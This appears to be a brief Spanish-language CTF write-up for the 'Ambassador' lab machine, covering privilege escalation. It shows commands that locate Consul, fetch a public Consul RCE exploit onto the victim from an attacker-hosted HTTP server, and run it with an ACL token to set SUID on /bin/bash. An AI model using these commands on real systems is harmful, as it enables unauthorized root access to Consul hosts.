

# IDENTIFICACIÓN
### IDENTIFICAR EN LA BIN
```shell
developer@ambassador:/opt/my-app$ which consul
```

### LISTAR PROCESO
```SHELL
developer@ambassador:/opt/my-app$ ps -aux | grep "consul"
```

# EXPLOTACIÓN
### RCE
```shell
#REPOSITORIO A UTILIZAR
https://github.com/owalid/consul-rce

#RECURSO DE INTERES.
❯ sudo wget https://raw.githubusercontent.com/owalid/consul-rce/refs/heads/main/consul_rce.py


#SERVIDOR LOCAL CON PYTHON
❯ sudo python3 -m http.server 80


#NOS TRAEMOS EL EXPLOIT A LA MÁQUINA VICTIMA
developer@ambassador:/tmp$ wget http://10.10.14.12/consul_rce.py

#A PARTIR DEL TOKEN LO EJECUTAMOS
developer@ambassador:/tmp$ python3 consul_rce.py -th 127.0.0.1 -tp 8500 -ct bb03b43b-1d81-d62b-24b5-39540ee469b5 -c "chmod u+s /bin/bash"
```

